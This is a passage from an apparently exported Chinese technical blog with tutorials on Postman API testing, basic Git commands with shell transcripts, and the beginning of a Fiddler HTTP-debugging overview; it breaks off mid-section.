在下图示例中设置了请求方法，请求URL，请求参数，但是没有设置请求头。在我的使用过程中，请求头是根据请求参数的形式自动生成的请求头中的Content-Type与请求参数的格式之间是有关联关系，比如：    </p><p><img src="https://img-blog.csdn.net/20180524000345232?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Z4YmluMTIz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2. POST请求</span><br><span class="line">POST请求二：json提交</span><br></pre></td></tr></tbody></table></figure><p>​    当我们选择JSON(application/json) 是会自动帮我们设置 headers 为 application/json。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2. POST请求</span><br><span class="line">POST请求三：xml提交</span><br><span class="line">POST请求四：二进制文件提交</span><br><span class="line">其它请求方式如PUT,DELETE 大致流程和GET,POST 差不多，这里就不一一举例说明了.</span><br></pre></td></tr></tbody></table></figure><p><strong>4.身份验证Authentication</strong></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、Basic Auth</span><br><span class="line">基础的验证，所以会比较简单，会直接把用户名、密码的信息放在请求的Header中。</span><br><span class="line">2、Digest Auth</span><br><span class="line">要比Basic Auth复杂的多。使用当前填写的值生成，authoriz</span><br><span class="line">ation header。所以在生成header之前要确保设置的正确性。如果当前的header已经存在，postman会移除之前的header。</span><br><span class="line">3、OAuth 1.0</span><br><span class="line">postman的OAuth helper让你签署支持OAuth1.0基于身份验证的请求。OAuth不用获取access token,你需要去API提供者获取的。OAuth 1.0可以在header或者查询参数中设置value。</span><br><span class="line">4、OAuth 2.0</span><br><span class="line">postman支持获得OAuth 2.0 token并添加到requests中。</span><br></pre></td></tr></tbody></table></figure><h2 id="实测一个查询手机号码归属地接口"><a href="#实测一个查询手机号码归属地接口" class="headerlink" title="实测一个查询手机号码归属地接口"></a>实测一个查询手机号码归属地接口</h2><p><strong>1.接口测试</strong></p><p>==<strong>文档部分信息</strong>==</p><table><thead><tr><th style="text-align:left">键</th><th style="text-align:left">值</th></tr></thead><tbody><tr><td style="text-align:left">接口地址：</td><td style="text-align:left"><a href="http://apis.juhe.cn/mobile/get" target="_blank" rel="noopener">http://apis.juhe.cn/mobile/get</a></td></tr><tr><td style="text-align:left">返回格式：</td><td style="text-align:left">json/xml</td></tr><tr><td style="text-align:left">请求方式:</td><td style="text-align:left">get</td></tr></tbody></table><p>==<strong>请求参数说明</strong>==</p><table><thead><tr><th>名称</th><th>必填</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>phone</td><td>是</td><td>int</td><td>需要查询的手机号码或手机号前7位</td></tr><tr><td>key</td><td>是</td><td>string</td><td>应用APPKEY(应用详细页查询)</td></tr><tr><td>dtype</td><td>否</td><td>string</td><td>返回数据的格式xml或json，默认json</td></tr></tbody></table><p>==<strong>根据上图接口文档相关信息填写request请求并获取响应</strong>==</p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/2Bp3oWlvWr9FsUQWZApx4vQkZuD9fnoXXbJgt9ZIblU!/b/dL8AAAAAAAAA&bo=swRpAgAAAAADB*4!&rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/QW202i6JSBr4lx*.61dcq1OuYZq2xjFx8rzF2t*CLoY!/b/dMMAAAAAAAAA&bo=ugTqAboE6gEDByI!&rf=viewer_4" alt></p><p><strong>2.接口断言</strong></p><p>==<strong>填写完以上请求参数后，尝试编写断言进行实际结果与预测结果进行对比</strong>==</p><p><img src="http://upload-images.jianshu.io/upload_images/2678772-a79103ca2efcb465" alt></p><p>==<strong>返回参数说明</strong>==</p><table><thead><tr><th>名称</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>error_code</td><td>int</td><td>返回码</td></tr><tr><td>reason</td><td>string</td><td>返回说明</td></tr><tr><td>result</td><td>string</td><td>返回结果集</td></tr><tr><td>province</td><td>string</td><td>省份</td></tr><tr><td>city</td><td>string</td><td>城市，（北京，上海，重庆，天津等直辖市可能为空）</td></tr><tr><td>areacode</td><td>string</td><td>区号，（部分记录为空）</td></tr><tr><td>zip</td><td>string</td><td>邮编，（部分记录可能为空）</td></tr><tr><td>company</td><td>string</td><td>运营商</td></tr></tbody></table><p>==<strong>JSON返回示例</strong>==</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">    <span class="attr">"resultcode"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"reason"</span>: <span class="string">"Return Successd!"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: {</span><br><span class="line">        <span class="attr">"province"</span>: <span class="string">"湖北"</span>,</span><br><span class="line">        <span class="attr">"city"</span>: <span class="string">"武汉"</span>,</span><br><span class="line">        <span class="attr">"areacode"</span>: <span class="string">"027"</span>,</span><br><span class="line">        <span class="attr">"zip"</span>: <span class="string">"430000"</span>,</span><br><span class="line">        <span class="attr">"company"</span>: <span class="string">"电信"</span>,</span><br><span class="line">        <span class="attr">"card"</span>: <span class="string">""</span></span><br><span class="line">    },</span><br><span class="line">    <span class="attr">"error_code"</span>: <span class="number">0</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>==<strong>服务级错误码参照(error_code)</strong>==</p><table><thead><tr><th>错误码</th><th>说明</th></tr></thead><tbody><tr><td>201101</td><td>手机号码不能为空</td></tr><tr><td>201102</td><td>错误的手机号码</td></tr><tr><td>201103</td><td>查询无结果</td></tr></tbody></table><p>==<strong>系统级错误码参照</strong>==</p><table><thead><tr><th>错误码</th><th>说明</th></tr></thead><tbody><tr><td>10001</td><td>错误的请求KEY</td></tr><tr><td>10002</td><td>该KEY无请求权限</td></tr><tr><td>10003</td><td>KEY过期</td></tr></tbody></table><p>==<strong>断言服务器返回http协议状态码为200</strong>==</p><p><img src="http://upload-images.jianshu.io/upload_images/2678772-1f839481bccdbf8d" alt></p><p>==<strong>验证服务器返回error_code字段值为0</strong>==</p><p><img src="http://upload-images.jianshu.io/upload_images/2678772-8e9a6f4011c6f79b" alt></p><p>==<strong>验证服务器返回reason字段值为Return Successd!</strong>==</p><p><img src="http://upload-images.jianshu.io/upload_images/2678772-d3344a8e1d218ae7" alt></p><p>==<strong>验证服务器返回province字段值为北京</strong>==</p><p><img src="http://upload-images.jianshu.io/upload_images/2678772-c7ee2eb6f5a908af" alt></p><p>==<strong>相同的验证方法，把后面的字段值验证完，并save保存至测试集中</strong>==</p><p><img src="http://upload-images.jianshu.io/upload_images/2678772-dab89181694c5019" alt></p><p><img src="http://upload-images.jianshu.io/upload_images/2678772-324e440d2017c783" alt></p><p>==<strong>保存完成后，在左侧测试集中出现脚本名称，点击 + 继续开发新的脚本</strong>==</p><p><img src="http://upload-images.jianshu.io/upload_images/2678772-8fb012679992cf45" alt></p><p>==<strong>在所有接口请求开发完成后，可以点击send发送请求，进行调试操作</strong>==</p><p><img src="http://upload-images.jianshu.io/upload_images/2678772-644d9ff9e58e403a" alt></p><p>==<strong>将Postman开发好的脚本导出，生成 *.json格式的文件</strong>==</p><p><img src="http://upload-images.jianshu.io/upload_images/2678772-9883e395fd3a15bf" alt></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol><li><a href="https://www.jianshu.com/p/6c9b45994c34" target="_blank" rel="noopener">Postman使用教程详解</a></li><li><a href="https://blog.csdn.net/fxbin123/article/details/80428216" target="_blank" rel="noopener">Postman使用方法详解</a></li></ol></body></html>]]></content>
      
      
      <categories>
          
          <category> debug工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Postman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git入门</title>
      <link href="/2019/08/17/git%E5%85%A5%E9%97%A8/"/>
      <url>/2019/08/17/git%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="Git入门"><a href="#Git入门" class="headerlink" title="Git入门"></a>Git入门</h1><h2 id="Git介绍"><a href="#Git介绍" class="headerlink" title="Git介绍"></a>Git介绍</h2><p>​    版本控制。</p><ul><li>牛X的互联网，牛X的大神们都在用</li><li>完整的版本控制功能，解决多人协作的问题</li><li>提高开发效率</li><li>程序员的必备技能，务必学习git,并习惯把自己的代码同步到github上</li><li>Git不同于github，理清两者之间的联系和差异</li></ul><h2 id="Git安装"><a href="#Git安装" class="headerlink" title="Git安装"></a>Git安装</h2><p>官网下载，傻瓜式安装即可。</p><h2 id="Git仓库"><a href="#Git仓库" class="headerlink" title="Git仓库"></a>Git仓库</h2><h3 id="信息配置"><a href="#信息配置" class="headerlink" title="信息配置"></a>信息配置</h3><p><code>- git configgit config --global user.name "Bicomir"</code></p><p><code>- git config --global user.email "18120570301@163.com"</code></p><p><code>- git config --list</code></p><h3 id="初始化版本库"><a href="#初始化版本库" class="headerlink" title="初始化版本库"></a>初始化版本库</h3><p><code>- git init</code></p><h3 id="添加文件到版本库"><a href="#添加文件到版本库" class="headerlink" title="添加文件到版本库"></a>添加文件到版本库</h3><p><code>- git add</code></p><p><code>- git commit</code></p><h3 id="查看仓库状态"><a href="#查看仓库状态" class="headerlink" title="查看仓库状态"></a>查看仓库状态</h3><p><code>- git status</code></p><h2 id="Git工作流"><a href="#Git工作流" class="headerlink" title="Git工作流"></a>Git工作流</h2><p>​    工作区–>暂存区–>版本库</p><p>​    假设有这么个故事是这样展开的，有个程序员刚去上班，每天产品经理会给他布置任务，任务以bash demo命名。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"># 1.第一天产品经理bash demo任务完成</span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Untracked files:</span><br><span class="line">  (use "git add <file>..." to include in what will be committed)</span><br><span class="line"></span><br><span class="line">        bash_demo.txt</span><br><span class="line"></span><br><span class="line">nothing added to commit but untracked files present (use "git add" to track)</span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git add bash_demo.txt</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use "git reset HEAD <file>..." to unstage)</span><br><span class="line"></span><br><span class="line">        new file:   bash_demo.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git commit -m "bash 1st commit"</span><br><span class="line">[master 9adb6ec] bash 1st commit</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 bash_demo.txt</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br><span class="line"># 2.事情不是那么简单，下午增加了临时任务，并要求下班前完成,</span><br><span class="line">下班前把东西放到了暂存区。</span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add <file>..." to update what will be committed)</span><br><span class="line">  (use "git checkout -- <file>..." to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        modified:   bash_demo.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git add bash_demo.txt</span><br><span class="line"></span><br><span class="line"># 3.第二天上班，被产品经理告知昨天附加需求多余，要求改回。</span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use "git reset HEAD <file>..." to unstage)</span><br><span class="line">        modified:   bash_demo.txt</span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git reset HEAD bash_demo.txt</span><br><span class="line">Unstaged changes after reset:</span><br><span class="line">M       bash_demo.txt</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add <file>..." to update what will be committed)</span><br><span class="line">  (use "git checkout -- <file>..." to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        modified:   bash_demo.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git checkout -- bash_demo.txt</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br><span class="line"># 4.将附加任务改回后，并开始第二天的任务。</span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add <file>..." to update what will be committed)</span><br><span class="line">  (use "git checkout -- <file>..." to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        modified:   bash_demo.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git add bash_demo.txt</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use "git reset HEAD <file>..." to unstage)</span><br><span class="line"></span><br><span class="line">        modified:   bash_demo.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git commit -m "2nd commit"</span><br><span class="line">[master 1111222] 2nd commit</span><br><span class="line"> 1 file changed, 2 insertions(+), 1 deletion(-)</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br><span class="line"># 5.被产品经理告知第二天的需求其实不需要，需要第一个版本。</span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git log</span><br><span class="line">commit 111122203a20e045217ff59323edcfeb8f12cc92 (HEAD -> master)</span><br><span class="line">Author: Bicomir <18120570301@163.com></span><br><span class="line">Date:   Mon Jul 8 20:09:53 2019 +0800</span><br><span class="line"></span><br><span class="line">    2nd commit</span><br><span class="line"></span><br><span class="line">commit 9adb6ec069364e8e09e726aed9109b70e8ab86be</span><br><span class="line">Author: Bicomir <18120570301@163.com></span><br><span class="line">Date:   Mon Jul 8 19:58:42 2019 +0800</span><br><span class="line"></span><br><span class="line">    bash 1st commit</span><br><span class="line"></span><br><span class="line">commit e8fe36664ee4f613126382440f58f5b30799c30b</span><br><span class="line">Author: Bicomir <18120570301@163.com></span><br><span class="line">Date:   Mon Jul 8 19:43:06 2019 +0800</span><br><span class="line"></span><br><span class="line">    repo2 1st commit</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git rests --hard</span><br><span class="line">git: 'rests' is not a git command. See 'git --help'.</span><br><span class="line"></span><br><span class="line">The most similar command is</span><br><span class="line">        reset</span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git reset --hard 9adb6ec069364e8e09e726aed9109b70e8ab86be</span><br><span class="line">HEAD is now at 9adb6ec bash 1st commit</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br><span class="line"># 第三天，被产品经理告知，bash demo这个需求不需要，要求删除。</span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git rm bash_demo.txt</span><br><span class="line">rm 'bash_demo.txt'</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ ls -a</span><br><span class="line">./  ../  .git/  test.txt</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use "git reset HEAD <file>..." to unstage)</span><br><span class="line"></span><br><span class="line">        deleted:    bash_demo.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git commit -m "delete bash_demo"</span><br><span class="line">[master 311da2e] delete bash_demo</span><br><span class="line"> 1 file changed, 1 deletion(-)</span><br><span class="line"> delete mode 100644 bash_demo.txt</span><br><span class="line"></span><br><span class="line">wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></tbody></table></figure><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/3Wnao1ErGHjLwJhR6csmZnFDUGFWlTJD7TVNEJCE15w!/b/dL8AAAAAAAAA&bo=xQKjAQAAAAADB0c!&rf=viewer_4" alt></p><h2 id="本地与远程仓库"><a href="#本地与远程仓库" class="headerlink" title="本地与远程仓库"></a>本地与远程仓库</h2><h4 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h4><p>​    我所熟知的远程仓库国外有GitHub、Bitbucket、GitLab,Azure Devops,国内有Coding，实际开发中国内或国外看场景都有可能用的到，不管仓库是什么，大体上差不多，在这里以熟知的GitHub为例。</p><p>​    <code>git remote add -> git pull -> git push -> git clone</code></p><h4 id="创建SSH-Key"><a href="#创建SSH-Key" class="headerlink" title="创建SSH Key"></a>创建SSH Key</h4><p><code>ssh-keygen -t rsa -C "youremail@example.com"</code></p><p>测试是否连通</p><p><code>ssh -T git@github.com</code></p><h4 id="添加远程仓库"><a href="#添加远程仓库" class="headerlink" title="添加远程仓库"></a>添加远程仓库</h4><p><code>git remote add origin git@github.com:tylerdemo/demo4.git</code></p><p><code>git pull origin master --allow-unrelated-histories</code></p><p><code>git push -u origin master</code></p><h2 id="克隆仓库"><a href="#克隆仓库" class="headerlink" title="克隆仓库"></a>克隆仓库</h2><p>​    方便团队协作开发，就是把远端的代码复制一份到本地。</p><p><code>git clone git@github.com:tylerdemo/demo4.git</code> </p><h2 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 查看所有标签</span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line"># 创建标签</span><br><span class="line">git tag name</span><br><span class="line"></span><br><span class="line"># 指定提交信息</span><br><span class="line">git tag -a name -m "comment"</span><br><span class="line"></span><br><span class="line"># 删除标签</span><br><span class="line">git tag -d name</span><br><span class="line"></span><br><span class="line"># 标签发布</span><br><span class="line">git push origin name</span><br></pre></td></tr></tbody></table></figure><p>​    <code>git tag -> git push</code>,以向远端仓库推送一个标签V1.0.1为例，命令如下:</p><p>​    <code>git tag</code></p><p>​    <code>git tag v1.0.1</code></p><p>​    <code>git tag</code></p><p>​    <code>git push origin v1.0.1</code></p><p>​    <code>git tag -d v1.0.1</code></p><h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><p>创建自己的分支，既安全又不影响工作。</p><p><code>git branch -> git cheakout -> git merge</code></p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/MSfht2iCZOQzjRGvE2Lu2wGNShY2.qwvMTwHQZ7OWUg!/b/dLgAAAAAAAAA&bo=OQN3AQAAAAADB24!&rf=viewer_4" alt></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 第一次任务</span><br><span class="line">git init</span><br><span class="line">git status</span><br><span class="line">echo "first branch demo" >> branch.txt</span><br><span class="line">git status</span><br><span class="line">git add branch.txt</span><br><span class="line">git commit -m "first branch commit"</span><br><span class="line">git status</span><br><span class="line"># 需要创建分支</span><br><span class="line">git branch feature_x   # 创建分支</span><br><span class="line">git branch # 查看当前分支</span><br><span class="line">git cheakout feature_x # 切换分支</span><br><span class="line">echo "new feature add" >> branch.txt</span><br><span class="line">git add branch,txt</span><br><span class="line">git commit -m "new feature add"</span><br><span class="line">git status</span><br><span class="line"># 新代码合并到master分支上</span><br><span class="line">git cheakout master</span><br><span class="line">git merge feature_x</span><br><span class="line">cat branch.txt</span><br><span class="line">git branch -d feature_x # 删除分支</span><br></pre></td></tr></tbody></table></figure><p>​    建议平时为提高开发效率使用source tree,高级的一些用法用命令行。</p><p>​    在这里，只是记录了常见的git命令，实际上高级玩家的玩法会复杂的多，后期再逐步积累吧，</p></body></html>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fiddler抓包工具总结</title>
      <link href="/2019/08/17/Fiddler%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/"/>
      <url>/2019/08/17/Fiddler%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="Fiddler介绍"><a href="#Fiddler介绍" class="headerlink" title="Fiddler介绍"></a>Fiddler介绍</h3><p>Fiddler（中文名称：小提琴）是一个HTTP的调试代理，以代理服务器的方式，监听系统的Http网络数据流动，Fiddler可以也可以让你检查所有的HTTP通讯，设置断点，以及Fiddle所有的“进出”的数据（我一般用来抓包）,Fiddler还包含一个简单却功能强大的基于JScript .NET事件脚本子系统，它可以支持众多的HTTP调试任务。</p><p>Fiddler官方网站提供了大量的帮助文档和视频教程,这是学习Fiddler的最好资料。</p><ul><li><a href="https://link.jianshu.com/?t=http://www.telerik.com/fiddler" target="_blank" rel="noopener">Fiddler_官方网站</a></li><li><a href="https://link.jianshu.com/?t=http://docs.telerik.com/fiddler/configure-fiddler/tasks/configurefiddler" target="_blank" rel="noopener">Fiddler_官方文档</a></li><li><a href="https://link.jianshu.com/?t=https://www.youtube.com/playlist?list=PLvmaC-XMqeBbw72l2G7FG7CntDTErjbHc" target="_blank" rel="noopener">Fiddler_官方视频</a></li><li><a href="https://link.jianshu.com/?t=http://www.telerik.com/fiddler/add-ons" target="_blank" rel="noopener">Fiddler_官方插件</a></li></ul><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p><img src="https://upload-images.jianshu.io/upload_images/947566-f51654e6f0018748.jpg" alt></p><p>其工作原理是，Fiddler是以代理WEB服务器的形式工作的,浏览器与服务器之间通过建立TCP连接以HTTP协议进行通信，浏览器默认通过自己发送HTTP请求到服务器，它使用代理地址:127.0.0.1, 端口:8888. 当Fiddler开启会自动设置代理， 退出的时候它会自动注销代理，这样就不会影响别的程序。不过如果Fiddler非正常退出，这时候因为Fiddler没有自动注销，会造成网页无法访问。解决的办法是重新启动下Fiddler。</p><h5 id="HTTP协议简介"><a href="#HTTP协议简介" class="headerlink" title="HTTP协议简介"></a>HTTP协议简介</h5><p>​    <strong>什么是HTTP协议</strong></p><p>​    